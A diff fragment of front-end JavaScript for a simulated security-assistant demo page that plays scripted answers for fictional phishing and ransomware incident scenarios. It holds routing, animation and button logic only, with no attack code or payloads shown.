+  gtitle:'Demo guide · Phishing / BEC',gdesc:'Scenario: Contoso Financial (fictional). A phishing email led to a stolen session and a hidden mailbox rule. Click a step to run it.',
+  chips:[['Summarize incident 4721','Summarize incident 4721'],['Analyze the phishing email','Analyze the phishing email'],['What is the blast radius of this incident?','What is the blast radius?'],['Give me an executive summary I can send to the CISO','Executive summary for the CISO']]},
+ ransom:{name:'Ransomware threat',tag:'Incident #5188 · Ransomware on device',pill:'Incident #5188 · Ransomware on device',
+  KB:KB_R,FOLLOW:FOLLOW_R,ROUTES:ROUTES_R,GUIDE:GUIDE_R,
+  gtitle:'Demo guide · Ransomware threat',gdesc:'Scenario: Contoso (fictional). A fake CV macro on an HR laptop led to a ransomware attempt that Defender disrupted. Click a step to run it.',
+  chips:[['Summarize incident 5188','Summarize incident 5188'],['Show the attack timeline and process tree','Attack timeline &amp; process tree'],['Decode the PowerShell command','Decode the PowerShell command'],['How do we contain and remediate this?','Contain &amp; remediate']]}
+};
+let cur='phish';
+function route(q){for(const [re,k] of SC[cur].ROUTES) if(re.test(q)) return k; return 'fall';}
+function setScenario(k){
+  cur=k;const S=SC[k];
+  document.querySelectorAll('.sc').forEach(e=>e.classList.toggle('on',e.dataset.s===k));
+  $('#chips').innerHTML=S.chips.map(c=>`<button class="chip" data-p="${c[0].replace(/"/g,'&quot;')}">${c[1]}</button>`).join('');
+  $('#guide').innerHTML=S.GUIDE.map((g,i)=>`<button class="demo" data-p="${g[0].replace(/"/g,'&quot;')}"><span class="n">${i+1}</span><b>${esc(g[0])}</b><em>${g[1]}</em><q>🎤 ${g[2]}</q></button>`).join('');
+  $('#gtitle').textContent=S.gtitle;$('#gdesc').textContent=S.gdesc;$('#pill').textContent=S.pill;
+  thread.innerHTML='';document.body.classList.remove('chatting');busy=false;
+}
+
+
+/* ---------- rendering ---------- */
+function wrapWords(el){
+  const spans=[],w=document.createTreeWalker(el,NodeFilter.SHOW_TEXT),nodes=[];
+  while(w.nextNode())nodes.push(w.currentNode);
+  nodes.forEach(n=>{
+    if(!n.nodeValue.trim())return;
+    const f=document.createDocumentFragment();
+    n.nodeValue.split(/(\s+)/).forEach(tok=>{
+      if(!tok)return;
+      if(/^\s+$/.test(tok))f.appendChild(document.createTextNode(tok));
+      else{const s=document.createElement('span');s.className='w';s.textContent=tok;f.appendChild(s);spans.push(s)}
+    });
+    n.parentNode.replaceChild(f,n);
+  });
+  return spans;
+}
+async function typeIn(el){
+  const sp=wrapWords(el);
+  for(let i=0;i<sp.length;i+=2){sp[i].classList.add('on');if(sp[i+1])sp[i+1].classList.add('on');if(i%12===0)toBottom();await sleep(22)}
+}
+async function fadeIn(el,ms=350){await sleep(30);el.classList.add('on');toBottom();await sleep(ms)}
+
+async function renderBlock(container,b){
+  let el;
+  if(b.t==='p'){el=document.createElement('p');el.innerHTML=b.h;container.appendChild(el);await typeIn(el)}
+  else if(b.t==='h'){el=document.createElement('h4');el.innerHTML=b.h;container.appendChild(el);await typeIn(el)}
+  else if(b.t==='ol'||b.t==='ul'){
+    el=document.createElement(b.t);container.appendChild(el);
+    for(const it of b.items){const li=document.createElement('li');li.innerHTML=it;el.appendChild(li);await typeIn(li)}
+  }
+  else if(b.t==='table'){
+    const wrap=document.createElement('div');wrap.className='tw fade';
+    wrap.innerHTML='<table><thead><tr>'+b.head.map(h=>`<th>${h}</th>`).join('')+'</tr></thead><tbody>'+
+      b.rows.map((r,i)=>`<tr class="${(b.hl||[]).includes(i)?'hl':''}">`+r.map(c=>`<td>${c}</td>`).join('')+'</tr>').join('')+'</tbody></table>';
+    container.appendChild(wrap);await fadeIn(wrap,450);
+  }
+  else if(b.t==='code'){
+    const head=document.createElement('div');head.className='codehead fade';
+    head.innerHTML='<span>'+(b.label||'KQL · Advanced hunting')+'</span><span><button class="mini" data-copy>Copy</button> <button class="mini" data-open>Open in Defender</button></span>';
+    const pre=document.createElement('pre');pre.className='fade';pre.innerHTML=b.h;pre.dataset.raw=b.raw;
+    head.querySelector('[data-copy]').onclick=()=>{navigator.clipboard&&navigator.clipboard.writeText(b.raw).catch(()=>{});toast('Query copied to clipboard')};
+    head.querySelector('[data-open]').onclick=()=>toast('Opening Advanced Hunting… (simulated)');
+    container.appendChild(head);container.appendChild(pre);await fadeIn(head,80);await fadeIn(pre,500);
+  }
+  else if(b.t==='actions'){
+    for(const a of b.items){
+      const d=document.createElement('div');d.className='act fade';
+      d.innerHTML=`<div class="tx"><b>${a[0]}</b><small>${a[1]}</small></div><button class="run">Run</button>`;
+      const btn=d.querySelector('button');
+      btn.onclick=async()=>{
+        if(btn.classList.contains('ok')||btn.classList.contains('busy'))return;
+        btn.className='run busy';btn.textContent='Running…';await sleep(1300);
+        btn.className='run ok';btn.textContent='✓ Done';toast(a[2].replace(/&amp;/g,'&'));
+      };
+      container.appendChild(d);await fadeIn(d,160);
+    }
+  }
+}
+
+async function ask(q){
+  q=q.trim();if(!q||busy)return;busy=true;
+  document.body.classList.add('chatting');closeDrawer();
+  ['in1','in2'].forEach(i=>$('#'+i).value='');setReady();
+  const S=SC[cur];const key=route(q);const data=S.KB[key];
+  const turn=document.createElement('div');turn.className='turn';
+  turn.innerHTML=`<div class="who me">You</div><div class="user">${esc(q)}</div>`;
+  thread.appendChild(turn);toBottom();
+  /* thinking */
+  const st=document.createElement('div');st.className='steps';
+  st.innerHTML=`<div class="who" style="margin-bottom:8px">${AV}<span>Security Copilot is working on it…</span></div>`+
+    data.steps.map(s=>`<div class="step"><span class="dot"></span><span>${s[0]}</span>${s[1]?`<span class="plug">${s[1]}</span>`:''}</div>`).join('');
+  turn.appendChild(st);toBottom();
+  const rows=[...st.querySelectorAll('.step')];
+  for(const r of rows){r.classList.add('run');await sleep(450+Math.random()*450);r.classList.remove('run');r.classList.add('done')}
+  await sleep(250);st.remove();
+  /* answer */
+  const head=document.createElement('div');head.className='who';head.style.marginTop='14px';head.innerHTML=AV+'<span>Security Copilot</span>';
+  const reply=document.createElement('div');reply.className='reply';
+  turn.appendChild(head);turn.appendChild(reply);
+  for(const b0 of data.blocks){
+    const b=Object.assign({},b0);
+    if(b.t==='p'&&b.h.includes('__Q__'))b.h=b.h.replace('__Q__',esc(q));
+    await renderBlock(reply,b);
+  }
+  const ft=document.createElement('div');ft.className='rfoot fade';
+  ft.innerHTML=`<button class="ib" title="Copy" onclick="toast('Copied')"><svg viewBox="0 0 24 24"><rect x="8" y="8" width="12" height="12" rx="2"/><path d="M4 16V6a2 2 0 0 1 2-2h10"/></svg></button>
+    <button class="ib" title="Good response" onclick="toast('Thanks for the feedback')"><svg viewBox="0 0 24 24"><path d="M7 11v9H4v-9zM7 11l4-8c2 0 3 1 3 3v3h5a2 2 0 0 1 2 2l-1 6a2 2 0 0 1-2 2H7"/></svg></button>
+    <button class="ib" title="Bad response" onclick="toast('Thanks for the feedback')"><svg viewBox="0 0 24 24"><path d="M17 13V4h3v9zM17 13l-4 8c-2 0-3-1-3-3v-3H5a2 2 0 0 1-2-2l1-6a2 2 0 0 1 2-2h11"/></svg></button>
+    <button class="ib" title="Pin to pinboard" onclick="toast('Pinned to investigation')"><svg viewBox="0 0 24 24"><path d="M12 17v5M9 3h6l-1 6 3 3v2H7v-2l3-3z"/></svg></button>
+    <span class="src">AI-generated content may be incorrect · ${new Date().toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'})}</span>`;
+  reply.appendChild(ft);await fadeIn(ft,100);
+  const fu=document.createElement('div');fu.className='follow fade';
+  fu.innerHTML=(S.FOLLOW[key]||S.FOLLOW.fall).map(p=>`<button class="chip" data-p="${p.replace(/"/g,'&quot;')}">${esc(p)}</button>`).join('');
+  turn.appendChild(fu);await fadeIn(fu,50);
+  busy=false;toBottom();$('#in2').focus();
+}
+
+function resetDemo(){thread.innerHTML='';document.body.classList.remove('chatting');busy=false;$('#in1').focus()}
+function setReady(){['s1','s2'].forEach((s,i)=>$('#'+s).classList.toggle('ready',$('#in'+(i+1)).value.trim().length>0))}
+
+setScenario('phish');
+/* events */
+['1','2'].forEach(n=>{
+  $('#in'+n).addEventListener('keydown',e=>{if(e.key==='Enter')ask(e.target.value)});
+  $('#in'+n).addEventListener('input',setReady);
+  $('#s'+n).addEventListener('click',()=>ask($('#in'+n).value));
+});
+document.addEventListener('click',e=>{
+  const sc=e.target.closest('[data-s]');if(sc){setScenario(sc.dataset.s);return}
+  const c=e.target.closest('[data-p]');if(c&&!c.closest('.mbox')){ask(c.dataset.p)}
+});
+document.addEventListener('keydown',e=>{if(e.key==='Escape'){closeDrawer();closeModal('plugModal');closeModal('flowModal')}});
+</script>
+</body>
+</html>
